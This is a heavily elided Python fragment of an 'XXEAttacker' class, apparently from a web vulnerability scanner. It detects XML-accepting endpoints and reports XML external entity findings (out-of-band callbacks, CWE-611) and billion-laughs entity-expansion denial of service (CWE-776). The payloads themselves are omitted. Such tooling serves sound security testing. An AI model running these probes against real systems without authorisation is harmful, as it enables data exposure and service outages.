...
class XXEAttacker:
    ...
    def _accepts_xml(self, url, headers):
        ...
        return (
            "xml" in ct
            or "soap" in url.lower()
            or any(x in url.lower() for x in [".xml", "/xml", "wsdl"])
        )
            ...
            async with self.session.post(
                ...
                if r.status in [200, 201, 202]:
                    return {
                        ...
                        "url": url,
                        "payload": p,
                        "evidence": f"OOB callback to {tok}.{self.oob}",
                        "cwe": "CWE-611",
                    }
        except:
            pass
    ...
    async def _billion_laughs(self, url):
        ...
        try:
            async with self.session.post(
                ...
                if el > 10:
                    return {
                        ...
                        "severity": "HIGH",
                        "url": url,
                        "evidence": f"{el:.1f}s processing time",
                        "cwe": "CWE-776",
                    }
            ...
            return {
                ...
                "severity": "HIGH",
                "url": url,
                "evidence": "Server timeout on entity expansion",
            }
        except:
            pass
